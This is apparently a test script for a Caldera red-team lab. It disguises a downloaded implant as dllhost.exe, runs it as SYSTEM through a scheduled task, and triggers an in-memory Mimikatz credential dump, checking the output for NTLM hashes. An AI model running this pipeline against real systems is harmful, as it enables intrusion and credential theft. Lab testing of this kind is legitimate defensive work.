import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

// ─── Building Blocks ─────────────────────────────────────────────────────────

async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

// ─── Connectivity Tests ─────────────────────────────────────────────────────

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Prereq Execution Tests ─────────────────────────────────────────────────

async function testSshPrereq() {
  console.log("\n=== SSH Prereq Execution ===")
  try {
    const output = await sshRun(KALI_IP, "kali", "kali", "id")
    console.log(`  PASS: "id" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmPrereq() {
  console.log("\n=== WinRM Prereq Execution ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "ver")
    console.log(`  PASS: "ver" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Sandcat Agent Deployment Test ──────────────────────────────────────────

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`
  try {
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    console.log("\n  [2] Download sandcat.go → C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

// ─── Full Pipeline Integration Test ──────────────────────────────────────────

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Powershell Mimikatz ===")

  const abilityId = "82dcefb5c3512d73bf2248cb0127c4ae"
  const abilityName = "Powershell Mimikatz"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  let agentPaw = null

  try {
    // ── Step 1: Clean slate ──
    console.log("\n  [1/5] Cleaning previous agents, processes, and tasks...")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: No prereq needed (kali_prereq and win_prereq are both empty) ──
    console.log("\n  [2/5] No prereqs required — ability downloads Invoke-Mimikatz.ps1 in-memory via IEX")
    console.log("    => skipping prereq installation")

    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [3/5] Deploying sandcat as SYSTEM (group=${group})...`)
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    // ── Step 4: Wait for agent + fetch ability ──
    console.log(`\n  [4/5] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [4b/5] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
    console.log(`    => command: ${ability.executors[0].command}`)

    // ── Step 5: Exploit (no payload/command modification needed) ──
    console.log(`\n  [5/5] Exploiting agent with ability (no command modification — runs in-memory)...`)
    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    // Wait for link to appear (powershell download + exec may take a while)
    console.log(`    => Waiting for link (180s timeout — IEX download + execution can be slow)...`)
    let linkFacts = []
    let linkStatus = null
    let linkOutput = ""
    let linkStderr = ""
    const pollStart = Date.now()
    while (Date.now() - pollStart < 180000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
        if (mine.finish != null) {
          console.log(`    Command: ${mine.command?.slice(0, 200)}...`)
          console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
          console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
          console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
          linkStatus = mine.status
          linkFacts = mine.facts || []
          linkOutput = mine.output?.stdout || ""
          linkStderr = mine.output?.stderr || ""
          break
        }
        console.log(`    Link pending (status=${mine.status}), waiting...`)
      }
      await new Promise(r => setTimeout(r, 3000))
    }

    // ── Verify results ──
    console.log(`\n    === Results Analysis ===`)

    // Check for success patterns: mimikatz outputs usernames, NTLM hashes, etc.
    const successPatterns = [
      { name: "mimikatz banner", pattern: /mimikatz/i },
      { name: "sekurlsa credentials", pattern: /sekurlsa/i },
      { name: "username entries", pattern: /Username\s*:/i },
      { name: "NTLM hashes", pattern: /NTLM\s*:/i },
      { name: "Domain entries", pattern: /Domain\s*:/i },
      { name: "Authentication Id", pattern: /Authentication\s+Id/i },
    ]

    console.log("    Checking stdout for mimikatz credential patterns:")
    let patternsFound = 0
    for (const p of successPatterns) {
      const found = p.pattern.test(linkOutput)
      console.log(`      ${found ? "[v]" : "[ ]"} ${p.name}: ${found ? "FOUND" : "not found"}`)
      if (found) patternsFound++
    }

    // Check for known failure patterns
    const failurePatterns = [
      { name: "access denied (AV blocked)", pattern: /access\s+denied/i },
      { name: "lsa acquire error (no admin)", pattern: /ERROR\s+kuhl_m_sekurlsa_acquireLSA/i },
      { name: "security error", pattern: /security\s+error/i },
      { name: "download failed", pattern: /Unable to connect|The remote server returned an error|404/i },
    ]

    console.log("    Checking stderr for known failure patterns:")
    let failuresFound = 0
    const failureDetails = []
    const combinedOutput = linkOutput + " " + linkStderr
    for (const p of failurePatterns) {
      const found = p.pattern.test(combinedOutput)
      if (found) {
        failuresFound++
        failureDetails.push(p.name)
        console.log(`      [!] ${p.name} DETECTED`)
      }
    }

    // Check stderr separately
    if (linkStderr) {
      console.log(`    stderr present (${linkStderr.length} chars), checking for errors...`)
      if (linkStderr.toLowerCase().includes("error")) {
        const errLines = linkStderr.split('\n').filter(l => l.toLowerCase().includes("error")).slice(0, 5)
        for (const l of errLines) {
          console.log(`      stderr: ${l.trim().slice(0, 150)}`)
        }
      }
    } else {
      console.log("    stderr: (none)")
    }

    // Check link facts
    for (const f of linkFacts.slice(0, 10)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }

    // Determine pass/fail
    let passed = false
    let reason = ""

    if (failuresFound > 0) {
      reason = `known failure detected: ${failureDetails.join(", ")}`
    } else if (patternsFound >= 2) {
      passed = true
      reason = `${patternsFound}/6 credential patterns found in output`
    } else if (patternsFound === 1) {
      passed = true
      reason = `${patternsFound} credential pattern found (minimal)`
    } else if (linkOutput.length > 100) {
      reason = `output present (${linkOutput.length} chars) but no credential patterns recognized`
      console.log(`    raw output (first 500 chars):\n------\n${linkOutput.slice(0, 500)}\n------`)
    } else if (linkOutput.length > 0) {
      reason = `output present but very short (${linkOutput.length} chars) — likely an error message`
      console.log(`    raw output:\n------\n${linkOutput}\n------`)
    } else {
      reason = "no stdout output from ability"
    }

    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (${reason})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    // ── Cleanup ──
    console.log("\n  [cleanup] Removing agent, task, process...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    console.log("    => cleanup complete")
  }
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log("testAbility — Powershell Mimikatz\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sshPrereq: await testSshPrereq(),
    winrmPrereq: await testWinrmPrereq(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed`)
  console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
  console.log(`  Full pipeline test: agentWait → abilityLookup → exploit → resultAnalysis → cleanup`)
  console.log(`\n  Powershell Mimikatz ability specifics:`)
  console.log(`    - In-memory PowerShell execution (no payload on disk)`)
  console.log(`    - Downloads Invoke-Mimikatz.ps1 via IEX (New-Object Net.WebClient)`)
  console.log(`    - Runs Invoke-Mimikatz -DumpCreds to extract credentials from LSASS`)
  console.log(`    - No kali_prereq or win_prereq required`)
  console.log(`    - No external binary payload to deploy`)
  console.log(`    - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege`)
  console.log(`    - Success: usernames + NTLM hashes in output`)
  console.log(`    - Common failures: access denied (AV blocking), ERROR kuhl_m_sekurlsa_acquireLSA (no admin)`)
}

main().catch(console.error)
